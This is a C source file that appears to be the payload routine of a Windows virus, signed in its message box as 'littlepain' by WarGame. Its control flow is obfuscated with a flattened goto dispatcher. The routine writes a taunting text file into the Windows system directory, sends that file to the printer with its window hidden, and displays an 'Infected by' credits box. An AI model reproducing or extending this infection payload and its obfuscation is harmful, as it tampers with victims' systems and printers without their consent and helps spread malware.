#include "data_globals.h"
#include <windows.h>
#include <shellapi.h>
#include <string.h>

#pragma optimize("", off)
void _Payload(void)
{
    volatile int dummy_state = 1;
    CHAR flag_path[MAX_PATH];
    HANDLE flag_fd;
    DWORD written;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    GetWindowsDirectoryA(flag_path, MAX_PATH);
    strcat(flag_path, "\\MSG_FOR_YOU.txt");
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    flag_fd = CreateFileA(flag_path, GENERIC_WRITE, FILE_SHARE_WRITE,
                          NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    if (flag_fd != INVALID_HANDLE_VALUE) {
        dummy_state = 4;
        goto dummy_dispatcher;
    }
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_state_4:
    WriteFile(flag_fd, "Dear user, your system needs some security improvements!",
              56, &written, NULL);
    CloseHandle(flag_fd);
    ShellExecuteA(NULL, "print", flag_path, NULL, NULL, SW_HIDE);
    MessageBoxA(NULL, "Infected by littlepain by [WarGame,#eof] ( italian guy )", "Credits",
                MB_OK | MB_ICONINFORMATION);
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return;
}
#pragma optimize("", on)
